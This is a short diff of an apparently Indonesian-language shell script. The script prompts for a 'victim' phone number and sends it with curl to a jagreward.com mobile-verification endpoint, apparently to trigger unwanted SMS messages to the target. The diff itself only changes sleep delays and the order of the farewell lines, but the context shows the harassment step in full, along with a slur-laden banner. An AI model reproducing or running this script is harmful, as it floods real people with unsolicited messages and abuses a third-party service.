@@ -23,10 +23,10 @@ sleep 1
 read -p "[Masukkan Nomor Hp Korban]>> " nomor
 link="https://id.jagreward.com/member/verify-mobile/$nomor"
 curl -s $link
-sleep 1
+sleep 6
 clear
 toilet -f big -F gay Thank You
-sleep 5
-echo "Selamat tinggal :)"
 sleep 1
+echo "Selamat tinggal :)"
+sleep 2
 exit
